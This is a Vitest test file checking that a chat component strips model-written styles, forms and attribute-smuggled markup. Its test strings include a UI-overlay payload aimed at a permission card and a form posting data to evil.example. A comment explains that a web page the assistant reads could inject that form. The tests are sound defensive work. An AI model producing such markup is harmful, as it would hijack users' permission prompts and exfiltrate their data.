import { describe, it, expect, vi, afterEach } from 'vitest';
import { mount, flushPromises, type VueWrapper } from '@vue/test-utils';
import { i18n } from '../../../../i18n';

/**
 * What the model writes cannot style the screen (review §5, S9).
 *
 * An answer that could style the page could lay a block over the permission
 * card's buttons, or relabel them. Its prose gets no `<style>` and no `style`.
 */

vi.mock('@tauri-apps/api/core', () => ({
  invoke: vi.fn(async () => []),
  convertFileSrc: (p: string) => p,
}));
vi.mock('@tauri-apps/api/event', () => ({ listen: vi.fn(async () => () => {}) }));
vi.mock('../../../../utils/logger', () => ({
  logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn(), debug: vi.fn() },
}));
vi.mock('../../../../composables/useNodeService', () => ({
  useNodeService: () => ({ writeNode: vi.fn() }),
}));

import MessageBubble from '../MessageBubble.vue';

let wrapper: VueWrapper<any> | null = null;
afterEach(() => {
  wrapper?.unmount();
  wrapper = null;
});

describe('what the model writes', () => {
  it('cannot bring its own styles', async () => {
    wrapper = mount(MessageBubble, {
      props: {
        message: {
          id: 'm',
          role: 'assistant',
          content:
            'Hello <style>.x{}</style><span style="position:fixed;inset:0">over the card</span>',
          timestamp: '',
        },
      },
      global: { plugins: [i18n] },
    });
    await flushPromises();
    const html = wrapper.html();
    expect(html).toContain('over the card');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('position:fixed');
    expect(wrapper.find('span[style]').exists()).toBe(false);
  });

  const render = async (content: string) => {
    wrapper = mount(MessageBubble, {
      props: { message: { id: 'm', role: 'assistant', content, timestamp: '' } },
      global: { plugins: [i18n] },
    });
    await flushPromises();
    return wrapper;
  };

  it('cannot bring a form that posts somewhere', async () => {
    // A page Syn read can ask it to end with this. A form needs no script to
    // send what it holds, so one click would carry it off.
    const w = await render(
      'Your balance is 1,234.\n\n<form action="https://evil.example/c"><input type="hidden" name="d" value="1234"><button formaction="https://evil.example/b">Show details</button><textarea>x</textarea><select><option>a</option></select></form>',
    );
    // The bubble's own copy and regenerate buttons are not the model's.
    const prose = w.find('.prose');
    const html = prose.html();
    expect(html).toContain('Your balance is 1,234.');
    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option']) {
      expect(prose.find(tag).exists(), `<${tag}> survived`).toBe(false);
    }
    expect(html).not.toContain('evil.example');
  });

  it('cannot smuggle markup through a wiki-link inside an attribute', async () => {
    // `[[…]]` was turned into a link after sanitising, so one inside an
    // attribute closed it and put what followed back into the page.
    const w = await render(
      '<img alt="[[<div style=\'position:fixed;inset:0\'>over</div>]]" src="x.png">',
    );
    const prose = w.find('.prose');
    expect(prose.find('div[style]').exists()).toBe(false);
    // The `alt` comes out garbled; what matters is that no element is styled.
    expect(prose.findAll('[style]').length).toBe(0);
  });

  it('still turns a wiki-link in prose into a link', async () => {
    const w = await render('See [[Pricing decision]] for why.');
    const link = w.find('a.wikilink');
    expect(link.exists()).toBe(true);
    expect(link.attributes('data-wikilink')).toBe('Pricing decision');
    expect(link.text()).toBe('Pricing decision');
  });
});
